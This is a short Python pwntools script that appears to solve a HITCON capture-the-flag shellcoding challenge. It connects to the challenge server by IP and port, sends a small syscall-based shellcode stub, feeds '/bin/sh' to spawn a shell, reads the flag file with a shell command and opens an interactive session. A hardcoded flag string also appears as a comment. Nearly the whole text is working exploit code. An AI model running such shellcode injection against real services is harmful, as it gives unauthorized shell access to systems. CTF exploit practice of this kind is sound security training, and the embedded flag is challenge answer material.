#!/usr/bin/env python
from pwn import *

# hitcon{sYsc4ll_is_m4g1c_in_sh31lc0d3}

context.arch = 'amd64'

host , port = '13.112.180.65' , 8361
y = remote( host , port )

sc = flat(
    0x3148ed3148fc8948,
    0x48c93148db3148c0,
    0xf63148ff3148d231,
    0x314dc9314dc0314d,
    0x4de4314ddb314dd2,
    0xff314df6314ded31,
    0x0000000000c48148
)[:-1]

#print disasm( sc )

"""
_asm = '''
push rsp
pop rsi
xor edx,esp
syscall
'''
"""

_asm = '''
    push rsp
    pop rsi
y:
    xor edx,esp
    syscall
    jmp y
'''

y.sendafter( ':' , asm( _asm ) )
#y.sendafter( ':' , asm( _asm ) + '\x75\xfa'  ) # jne    0xfffffffffffffffc -> jne -4

sleep(0.7)

y.send( '/bin/sh'.ljust( 322 , '\x00' ) )

sleep( 0.7 )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()